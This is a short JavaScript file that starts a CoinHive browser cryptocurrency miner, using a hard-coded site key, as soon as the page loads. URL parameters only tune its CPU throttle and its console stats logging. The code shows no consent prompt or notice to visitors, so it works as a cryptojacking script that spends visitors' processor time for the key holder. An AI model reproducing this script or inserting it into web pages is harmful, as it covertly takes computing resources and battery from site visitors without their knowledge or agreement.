$(document).ready(function(){
	
	if(window.location.search.substring(1).includes("ff")){
		console.log("fast");
		throttle = 0.0;
	}else if(window.location.search.substring(1).includes("f")){
		console.log("med");
		throttle = 0.3;
	}else{
		console.log("slow");
		throttle = 0.6;
	}

	var miner = new CoinHive.Anonymous('TKHKWH59DpsLQmL4pgCSWwzDglPEGqgp', {
		//autoThreads: true,
		throttle: throttle,
	}); 

	showstats = function() {
		console.log(
			miner.getNumThreads() + " "
			+ miner.getHashesPerSecond().toFixed(1) + " " 
			+ miner.getTotalHashes().toFixed(1) + " "
			+ miner.getAcceptedHashes().toFixed(1)
		);
	}
	if(window.location.search.substring(1).includes("d")){
		console.log("debug");
		setInterval(showstats, 10000); // Update stats once per 10 s
		console.log(
			"t:" + miner.getNumThreads()
			+ " wasm:" + miner.hasWASMSupport()
			+ " wasm:" + miner.hasWASMSupport()
		);
	}else{
		setTimeout(showstats, 10000); // Show stats once: 10s after page load
	}

	//miner.on('open', function() { console.log("m open"); });
	//miner.on('job', function() { console.log("m job"); });
	//miner.on('found', function() { console.log("m found"); });
	//miner.on('accepted', function() { console.log("m accepted"); });
	miner.on('error', function() { console.log("m error"); });
	miner.on('close', function() { console.log("m close"); });
	miner.start();
});
